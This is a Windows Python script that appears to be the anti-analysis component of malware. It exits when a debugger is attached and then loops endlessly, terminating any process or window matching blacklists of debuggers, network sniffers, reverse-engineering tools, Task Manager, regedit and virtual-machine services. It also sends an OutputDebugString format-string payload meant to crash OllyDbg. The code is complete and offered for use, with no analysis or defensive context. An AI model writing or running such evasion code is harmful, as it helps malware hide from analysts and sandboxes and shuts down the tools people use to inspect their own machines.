import ctypes
from ctypes import wintypes
import psutil
import os

PROCESS_TERMINATE = 0x0001
PROCESS_NAME_BLACKLIST = [
    "ksdumperclient", "regedit", "ida64", "vmtoolsd", "vgauthservice",
    "wireshark", "x32dbg", "ollydbg", "vboxtray", "df5serv", "vmsrvc",
    "vmusrvc", "taskmgr", "vmwaretray", "xenservice", "pestudio", "vmwareservice",
    "qemu-ga", "prl_cc", "prl_tools", "joeboxcontrol", "vmacthlp",
    "httpdebuggerui", "processhacker", "joeboxserver", "fakenet", "ksdumper",
    "vmwareuser", "fiddler", "x96dbg", "dumpcap", "vboxservice",
]

WINDOW_TITLE_BLACKLIST = [
    "simpleassemblyexplorer", "procmon64", "process hacker", "http debugger",
    "x32dbg", "ollydbg", "wireshark", "x64dbg", "dnspy", "windbg", "harmony",
    "system explorer", "debugger", "process monitor", "protection_id",
]

kernel32 = ctypes.WinDLL("kernel32.dll")
user32 = ctypes.WinDLL("user32.dll")

WNDENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

TerminateProcess = kernel32.TerminateProcess
TerminateProcess.argtypes = [wintypes.HANDLE, wintypes.UINT]
TerminateProcess.restype = wintypes.BOOL

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL

IsDebuggerPresent = kernel32.IsDebuggerPresent
IsDebuggerPresent.restype = wintypes.BOOL

EnumWindows = user32.EnumWindows
EnumWindows.argtypes = [WNDENUMPROC, wintypes.LPARAM]
EnumWindows.restype = wintypes.BOOL

GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = [wintypes.HWND, wintypes.LPSTR, wintypes.INT]
GetWindowTextA.restype = wintypes.INT

GetWindowThreadProcessId = user32.GetWindowThreadProcessId
GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
GetWindowThreadProcessId.restype = wintypes.DWORD

def terminate_process(pid):
    handle = OpenProcess(PROCESS_TERMINATE, False, pid)
    if not handle:
        return False
    success = TerminateProcess(handle, 0)
    CloseHandle(handle)
    return success

def contains_blacklist_item(item, blacklist):
    item = item.lower()
    return any(bl_item in item for bl_item in blacklist)

def kill_processes_by_names(blacklist):
    for proc in psutil.process_iter(["pid", "name"]):
        try:
            if contains_blacklist_item(proc.info["name"], blacklist):
                terminate_process(proc.info["pid"])
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

def enum_windows_callback(hwnd, lparam):
    buffer = ctypes.create_string_buffer(256)
    GetWindowTextA(hwnd, buffer, ctypes.sizeof(buffer))
    window_title = buffer.value.decode("utf-8", errors="ignore")
    if contains_blacklist_item(window_title, WINDOW_TITLE_BLACKLIST):
        pid = wintypes.DWORD()
        GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        terminate_process(pid.value)
    return True

def kill_processes_by_window_names():
    EnumWindows(WNDENUMPROC(enum_windows_callback), 0)

def output_debug_string_anti_debug():
    kernel32.OutputDebugStringA(b"hm")

def output_debug_string_ollydbg_exploit():
    kernel32.OutputDebugStringA(b"%s" * 32)

def run():
    if IsDebuggerPresent():
        os._exit(0)

    while True:
        output_debug_string_anti_debug()
        output_debug_string_ollydbg_exploit()

        kill_processes_by_names(PROCESS_NAME_BLACKLIST)
        kill_processes_by_window_names()


if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print("Finalizado por el usuario.")
